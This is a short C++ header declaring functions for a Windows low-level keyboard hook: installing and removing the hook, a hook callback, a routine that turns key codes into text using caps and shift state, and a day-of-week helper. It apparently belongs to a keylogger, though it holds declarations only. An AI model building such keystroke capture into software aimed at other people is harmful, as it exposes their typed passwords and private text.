#pragma once


BOOL HookKeyBoard();
void unhookKeyboard();
std::string Dayofweek(int code);
LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam);
std::string HookCode(DWORD code, BOOL caps, BOOL shift);
